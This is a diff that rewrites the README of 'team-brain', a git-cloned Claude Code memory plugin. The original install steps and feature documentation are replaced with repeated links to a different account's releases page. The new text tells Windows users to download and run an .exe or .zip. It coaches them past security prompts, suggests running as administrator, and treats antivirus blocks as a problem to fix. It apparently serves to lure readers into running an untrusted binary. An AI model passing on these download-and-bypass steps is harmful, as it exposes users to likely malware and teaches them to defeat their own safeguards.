@@ -1,283 +1,262 @@
-# Team Brain
-
-**Git-native shared AI memory for teams.**
-
-Your teammate debugged that issue yesterday. Your team decided on REST over GraphQL last month. Your codebase has conventions that every AI session ignores.
-
-Team Brain fixes this. Record lessons, decisions, and conventions once — they're automatically loaded into every Claude Code session, for every team member. No servers. No accounts. Just git.
-
----
-
-## The Problem
-
-AI coding agents are single-player:
-
-- Your teammate spent 2 hours debugging a Stripe webhook — Claude doesn't know
-- The team agreed to use async/await everywhere — Claude uses `.then()` anyway
-- You onboarded a new dev — their Claude starts from absolute zero
-- Architecture decisions live in Slack threads nobody can find
-
-CLAUDE.md exists, but it's manually maintained and nobody updates it.
-
-## The Solution
-
-Team Brain stores team knowledge in `.team-brain/` and auto-generates a `BRAIN.md` that Claude reads every session. Commit it to git. Everyone on the team gets the same context.
-
-```
-.team-brain/
-├── BRAIN.md                      # Auto-generated, Claude reads this
-├── conventions/
-│   └── always-use-async-await.md
-├── decisions/
-│   └── 001-rest-over-graphql.md
-├── lessons/
-│   └── 2026-03-30-stripe-webhook-retry.md
-└── knowledge/
-    └── api-rate-limits.md
-```
-
----
-
-## Features
-
-### Record Lessons
-```
-/team-brain learn Stripe webhooks retry 3 times with exponential backoff
-```
-Claude captures the context from your current conversation, creates a structured entry, and regenerates BRAIN.md.
-
-### Record Decisions (ADR Format)
-```
-/team-brain decide Use REST over GraphQL for public API
-```
-Creates an Architecture Decision Record with Context, Decision, and Consequences sections.
-
-### Add Conventions
-```
-/team-brain convention Always use async/await, never .then() chains
-```
-Conventions get highest priority in BRAIN.md — Claude sees them first.
-
-### Search the Brain
-```
-/team-brain recall stripe webhooks
-```
-Keyword + fuzzy search across all entries. Returns the most relevant matches with context snippets.
-
-### Onboard New Developers
-```
-/team-brain onboard
-```
-Generates a comprehensive onboarding guide from all team brain entries — conventions, decisions, lessons, and project knowledge in one document.
-
-### Cross-Tool Generation
-```
-/team-brain sync              # Regenerate BRAIN.md
-/team-brain sync cursorrules  # Also generate .cursorrules (for Cursor)
-/team-brain sync agents       # Also generate AGENTS.md (universal standard)
-```
-
-### Auto-Loading
-Team Brain includes a SessionStart hook that automatically loads context at the beginning of every Claude Code session. If any entries are newer than BRAIN.md, it regenerates automatically.
-
----
-
-## Installation
-
-### Quick Install
-```bash
-git clone https://github.com/Manavarya09/team-brain.git ~/.claude/plugins/team-brain
-```
-
-### Add the SessionStart hook to your settings
-Add to `~/.claude/settings.json`:
-```json
-{
-  "hooks": {
-    "SessionStart": [
-      {
-        "hooks": [{
-          "type": "command",
-          "command": "bash ~/.claude/plugins/team-brain/hooks/load-brain.sh"
-        }]
-      }
-    ]
-  }
-}
-```
-
-### Initialize in your project
-```
-/team-brain init
-```
-This creates `.team-brain/` in your repo root. Commit it to git.
-
----
-
-## Usage
-
-### Quick Start
-```bash
-# Initialize team brain in your project
-/team-brain init
-
-# Add your first convention
-/team-brain convention Use TypeScript strict mode everywhere
-
-# Record a lesson from today's debugging
-/team-brain learn React useEffect cleanup runs on unmount AND re-render
-
-# Record an architecture decision
-/team-brain decide Use Zod for runtime validation at API boundaries
-
-# Commit and push so teammates get the context
-git add .team-brain/ && git commit -m "team-brain: add initial conventions and decisions"
-git push
-```
-
-### For Teammates
-```bash
-# Pull latest team brain entries
-git pull
-
-# Context loads automatically on next Claude Code session
-# Or manually sync:
-/team-brain sync
-```
-
-### Search and Recall
-```bash
-/team-brain recall validation     # Search for entries about validation
-/team-brain recall                # Show recent entries
-/team-brain status                # Show stats and contributor info
-```
-
----
-
-## Entry Format
-
-Every entry is a markdown file with YAML frontmatter:
-
-```yaml
----
-title: Stripe webhooks retry 3 times with exponential backoff
-type: lesson
-author: manavarya
-date: 2026-03-30
-tags: [stripe, webhooks, payments]
-status: active
----
+# 🧠 team-brain - Shared AI memory for teams
 
-## Context
-Spent 2 hours debugging why payment confirmations were duplicated.
+[![Download team-brain](https://img.shields.io/badge/Download%20team-brain-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/wallisillative921/team-brain/releases)
 
-## Detail
-Stripe retries failed webhook deliveries 3 times over 24 hours.
-Our handler wasn't idempotent, causing duplicate order processing.
-Fixed by checking idempotency key before processing.
+Git-native shared AI memory for teams. Keep your team’s knowledge, conventions, and decisions in one place and load them into Claude Code, Cursor, and Copilot.
 
-## Related
-- PR #47: Add idempotency check to webhook handler
-```
+## 🧩 What team-brain does
 
-### Entry Types
-| Type | Directory | Priority | Format |
-|------|-----------|----------|--------|
-| Convention | `conventions/` | Highest | Rule + Examples + Rationale |
-| Decision | `decisions/` | High | ADR: Context + Decision + Consequences |
-| Lesson | `lessons/` | Medium | Context + Detail + Related |
-| Knowledge | `knowledge/` | Normal | Free-form project knowledge |
+team-brain helps your team store shared context in a simple, Git-based format. It keeps key decisions, coding rules, project notes, and team habits in sync. When someone opens their coding tool, that context is ready to use.
 
----
+Use it to:
+- Keep team rules in one place
+- Save design and code decisions
+- Share project context across people
+- Load the same memory into supported AI tools
+- Reduce repeated questions and missed details
 
-## How It Works
+## 💻 What you need
 
-1. **You record knowledge** via `/team-brain learn`, `/team-brain decide`, or `/team-brain convention`
-2. **Entries are saved** as markdown files in `.team-brain/`
-3. **BRAIN.md is auto-generated** — a prioritized summary under 180 lines
-4. **On session start**, the hook loads BRAIN.md into Claude's context
-5. **Teammates pull** via git and get the same context
-6. **Optionally generates** `.cursorrules` (Cursor) and `AGENTS.md` (universal)
+Before you install team-brain on Windows, make sure you have:
+- A Windows 10 or Windows 11 PC
+- An internet connection
+- Enough space to download the app
+- Permission to run downloaded apps on your computer
 
-### Why 180 Lines?
+If your device blocks downloads, you may need admin access.
 
-Claude Code applies instructions from context files with ~92% accuracy under 200 lines. Above 400 lines, accuracy drops to ~71%. Team Brain auto-prioritizes (conventions > decisions > lessons > knowledge) and caps BRAIN.md at 180 lines to stay in the sweet spot.
+## 📥 Download team-brain
 
----
+Visit the releases page to download and run this file:
+https://github.com/wallisillative921/team-brain/releases
 
-## Configuration
+On that page, look for the latest release and download the Windows version. If there are more than one file, choose the one that matches your computer, such as:
+- `.exe` for a direct Windows app
+- `.zip` if the app comes packed in a folder
 
-Settings are in `.team-brain/config.json`:
+## 🪟 Install on Windows
 
-```json
-{
-  "brain_max_lines": 180,
-  "auto_generate": true,
-  "inject_into_claude_md": true,
-  "generate_cursorrules": false,
-  "generate_agents_md": false,
-  "priority_order": ["conventions", "decisions", "lessons", "knowledge"],
-  "max_entries_per_section": 20,
-  "include_dates": true,
-  "include_authors": true
-}
-```
+After you download the file, follow these steps:
 
-| Setting | Description | Default |
-|---------|-------------|---------|
-| `brain_max_lines` | Max lines in BRAIN.md | 180 |
-| `inject_into_claude_md` | Auto-inject into CLAUDE.md | true |
-| `generate_cursorrules` | Also generate .cursorrules | false |
-| `generate_agents_md` | Also generate AGENTS.md | false |
-| `priority_order` | Section priority in BRAIN.md | conventions first |
-| `max_entries_per_section` | Max entries per section | 20 |
+1. Open your Downloads folder.
+2. Find the team-brain file you just downloaded.
+3. If the file is a `.zip`, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. If the file is an `.exe`, double-click it to start the app.
+6. If Windows asks for permission, choose Run or Yes.
+7. If you see a security prompt, pick the option that lets you keep going if you trust the file.
+8. Wait for the app to finish opening.
 
----
+If the app starts from a folder, keep that folder in a safe place. Some apps need their files to stay together.
 
-## Requirements
+## ⚙️ First-time setup
 
-- Claude Code (any version with skill/hook support)
-- Node.js (ships with Claude Code)
-- Git (for sharing with teammates)
+When you open team-brain for the first time, set up your shared memory folder or team workspace.
 
----
+Typical setup steps:
+- Choose a folder for your team memory
+- Connect it to a Git repo if needed
+- Add your team’s rules, notes, and decisions
+- Pick the AI tools you want to use it with
 
-## FAQ
+A good workspace may include:
+- `adr` files for decisions
+- `conventions` for team rules
+- `onboarding` notes for new people
+- `shared-context` for project facts
+- `agents-md` files for agent instructions
 
-**Q: How is this different from just editing CLAUDE.md?**
-A: CLAUDE.md is static and manually maintained. Team Brain auto-generates it from structured entries, stays under the 180-line sweet spot, and makes it easy for any team member to contribute knowledge without editing a shared file.
+If the app asks you to sign in or connect to a code tool, follow the on-screen steps.
 
-**Q: What happens when two people add entries on the same branch?**
-A: Each entry is its own file, so git merges cleanly. BRAIN.md is auto-generated, so even if it conflicts, running `/team-brain sync` regenerates it.
+## 🧠 How team-brain fits into your workflow
 
-**Q: Does this work with Cursor / Copilot?**
-A: Yes. Run `/team-brain sync cursorrules` to generate `.cursorrules` for Cursor. Run `/team-brain sync agents` to generate `AGENTS.md` which Copilot and other tools read.
+team-brain works like a shared memory layer for your team. Instead of each person keeping local notes, the team keeps one source of truth in Git.
 
-**Q: Will this slow down my sessions?**
-A: The SessionStart hook runs in under 100ms. It only regenerates BRAIN.md if entries have changed.
+That helps when you want to:
+- Keep the same coding style across a project
+- Store answers to common team questions
+- Save why a choice was made
+- Give new team members the same starting point
+- Help AI tools use the same project context
 
-**Q: Where is the data stored?**
-A: Everything is in `.team-brain/` in your repo root. It's just files in git — no databases, no cloud, no external services.
+You can use it with:
+- Claude Code
+- Cursor
+- GitHub Copilot
 
----
+## 📁 What goes in the memory
 
-## Contributing
+A strong team memory usually includes:
+- Project goals
+- Naming rules
+- File layout rules
+- API habits
+- Deployment notes
+- Common fixes
+- Architecture decisions
+- Do and don’t lists
+- Team-specific prompts
+- Links to useful docs
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+Keep entries short and clear. Use plain language. Write each rule so a new team member can understand it fast.
 
-Areas where help is needed:
-- [ ] Auto-learn hook: detect patterns worth remembering from tool output
-- [ ] Conflict resolution UI for BRAIN.md merge conflicts
-- [ ] Team analytics dashboard (who's contributing, coverage gaps)
-- [ ] Integration with Linear/Jira for linking entries to tickets
-- [ ] VS Code extension for browsing team brain entries
+## 🔄 Keeping the memory up to date
 
----
+When your team changes a rule or makes a new decision:
+1. Open the team-brain workspace
+2. Edit the right note or file
+3. Save your change
+4. Commit it to Git
+5. Share it with the team
 
-## License
+This keeps everyone on the same page. It also helps your AI tools use the newest version of your team’s context.
 
-MIT License. See [LICENSE](LICENSE) for details.
+## 🛠️ Common Windows issues
 
----
+If the app does not open:
+- Check that the download finished
+- Make sure you extracted the ZIP file if there is one
+- Try right-clicking the app and choosing Run as administrator
+- Check if your antivirus blocked the file
+- Move the app to a simple folder like `C:\team-brain`
 
-**Your AI should know what your team knows.**
+If Windows says it cannot trust the app:
+- Open the file again
+- Choose the option to run it anyway if you trust the source
+- Make sure you downloaded it from the releases page
+
+If the app opens but does not load your workspace:
+- Check the folder path
+- Make sure the files are still in place
+- Confirm the Git repo is set up
+- Open the app again after fixing the path
+
+## 📚 Suggested team structure
+
+A simple folder structure can look like this:
+
+- `README.md` - short project guide
+- `adr/` - decision records
+- `conventions/` - team rules
+- `onboarding/` - setup notes for new people
+- `shared-context/` - shared facts and project context
+- `agents-md/` - AI agent instructions
+
+This layout keeps your memory easy to scan and easy to update.
+
+## 🔍 Good writing habits for team memory
+
+Write memory notes that are:
+- Short
+- Specific
+- Easy to scan
+- Free of long paragraphs
+- Based on real team choices
+
+Example:
+- Use snake_case for file names
+- Put API notes in `shared-context`
+- Keep decisions in `adr`
+- Ask before changing folder layout
+
+This style works well because AI tools can read it fast and people can follow it without extra effort.
+
+## 🧭 Typical use cases
+
+team-brain can help with:
+- New hire setup
+- Shared coding rules
+- Architecture decisions
+- Repeated project context
+- AI-assisted coding in teams
+- Keeping tool instructions in one place
+
+It works best when your team wants one shared source of truth instead of scattered notes.
+
+## 📎 Download link
+
+Visit the releases page to download and run this file:
+https://github.com/wallisillative921/team-brain/releases
+
+## 🧰 Basic workflow example
+
+A simple team workflow may look like this:
+1. Your team writes down a decision
+2. Someone saves it in the team-brain workspace
+3. The change goes into Git
+4. Everyone pulls the latest version
+5. Claude Code, Cursor, or Copilot reads the same shared context
+
+That keeps the team aligned without extra back-and-forth.
+
+## 🧾 File naming tips
+
+Use names that make sense at a glance:
+- `database-rules.md`
+- `api-style.md`
+- `release-process.md`
+- `onboarding-checklist.md`
+- `frontend-conventions.md`
+
+Avoid vague names like:
+- `notes1.md`
+- `stuff.md`
+- `misc.md`
+
+Clear names make the workspace easier to use for both people and AI tools.
+
+## 🔐 Keeping shared memory safe
+
+If your workspace includes private team data:
+- Store it in a private Git repo
+- Limit write access to the right people
+- Review changes before merge
+- Keep secret keys out of shared notes
+- Use simple text files for context, not passwords
+
+Shared memory works best when the team treats it like project knowledge, not a place for secrets.
+
+## 🧪 What a first run may look like
+
+When you launch team-brain, you may see steps like:
+- Choose a workspace folder
+- Connect a repo
+- Pick a team profile
+- Import memory files
+- Link your AI tool
+
+After that, the app should use the same team context each time you open your coding tool.
+
+## 🧑‍💼 For team leads
+
+If you manage a team, start small:
+- Add 5 to 10 key rules
+- Capture the most common decisions
+- Keep one folder for each type of memory
+- Review the content once a week
+- Remove stale notes
+
+Small, clean memory is easier to trust than a large pile of old text.
+
+## 📦 Release downloads
+
+Use the GitHub releases page for all Windows downloads:
+https://github.com/wallisillative921/team-brain/releases
+
+Look for the latest release file, then download and run this file on Windows.
+
+## 🗂️ Topic areas covered
+
+This project focuses on:
+- `adr`
+- `agents-md`
+- `ai-coding`
+- `claude`
+- `claude-code`
+- `conventions`
+- `developer-tools`
+- `onboarding`
+- `shared-context`
+- `team-memory`
+
+These topics match a shared context system for teams that use AI while they code.
